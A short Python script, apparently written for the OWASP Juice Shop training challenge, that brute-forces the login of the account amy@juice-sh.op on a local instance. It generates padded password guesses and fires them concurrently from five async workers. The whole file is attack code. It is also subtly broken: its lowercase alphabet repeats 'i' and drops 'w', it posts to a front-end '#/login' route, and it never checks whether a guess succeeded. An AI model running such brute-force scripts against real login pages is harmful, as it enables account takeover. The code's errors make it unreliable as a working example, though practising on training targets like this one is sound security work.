import requests
import aiohttp
import asyncio

your_juice_shop_url = "http://localhost:3000/#/login"

def build_queue():

    queue = []

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = "abcdefghijklmniopqrstuvxyz"
    numbers = "0123456789"

    for up_letter in uppercase_letters: 
        for low_letter in lowercase_letters:
            for number in numbers:
                queue.append(f"{up_letter}{number}{low_letter}.....................")                
    return queue

async def login_amy(name, async_queue):

    async with aiohttp.ClientSession() as session:
        while not async_queue.empty():
            password = await async_queue.get()
            print(f"Task {name}:\t Trying password: {password}")
            async with session.post(your_juice_shop_url, json={'email': 'amy@juice-sh.op', 'password': password}) as response:
                await response.text()

async def main(password_queue):

    async_queue = asyncio.Queue()

    for password in password_queue:
        await async_queue.put(password)

    await asyncio.gather(
            asyncio.create_task(login_amy("One", async_queue)),
            asyncio.create_task(login_amy("Two", async_queue)),
            asyncio.create_task(login_amy("Three", async_queue)),
            asyncio.create_task(login_amy("Four", async_queue)),
            asyncio.create_task(login_amy("Five", async_queue)),
        )

    return False

if __name__ == "__main__": 
    password_queue = build_queue()
    asyncio.run(main(password_queue))